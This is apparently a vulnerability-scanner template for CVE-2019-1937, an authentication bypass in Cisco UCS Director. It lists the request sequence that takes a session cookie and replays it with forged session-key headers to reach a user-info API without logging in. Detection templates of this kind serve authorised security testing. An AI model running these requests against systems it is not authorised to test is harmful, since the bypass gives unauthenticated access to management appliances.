name: poc-yaml-cisco-cve-2019-1937
set:
  host: parseURL(url)['host']
  r1: randomLowercase(3)
  r2: randomLowercase(3)
rules:
  - method: GET
    path: /app/ui/ClientServlet?apiName=GetUserInfo
    headers:
      Referer: https://{{host}}/
      X-Requested-With: XMLHttpRequest
    follow_redirects: true
    expression: |
      status==302&&headers['location']== "https://{{host}}/app/ui/login.jsp"
  - method: GET
    path: /app/ui/login.jsp
    headers:
      Referer: https://{{host}}/
      X-Requested-With: XMLHttpRequest
    follow_redirects: true
    search: |
      JSESSIONID=(?P<JSESSIONID>.+?);
    expression: |
      status==200
  - method: GET
    path: /app/ui/ClientServlet?apiName=GetUserInfo
    headers:
      Referer: https://{{host}}/
      X-Requested-With: XMLHttpRequest
      Cookie: JSESSIONID={{JSESSIONID}};
    follow_redirects: true
    search: |
      JSESSIONID=(?P<JSESSIONID>.+?);
    expression: |
      status==302&&headers['location'] == "https://{{host}}/app/ui/login.jsp"
  - method: GET
    path: /app/ui/ClientServlet?apiName=GetUserInfo
    headers:
      Referer: https://{{host}}/
      X-Requested-With: XMLHttpRequest
      Cookie: JSESSIONID={{JSESSIONID}};
      X-Starship-UserSession-Key: "{{r1}}"
      X-Starship-Request-Key: "{{r1}}"
    follow_redirects: true
    expression: |
      status==200&&body.bcontains(b'productaccess_id')
detail:
  author: thatqier
  links:
    - https://raw.githubusercontent.com/pedrib/PoC/master/advisories/cisco-ucs-rce.txt
    - https://seclists.org/fulldisclosure/2019/Aug/36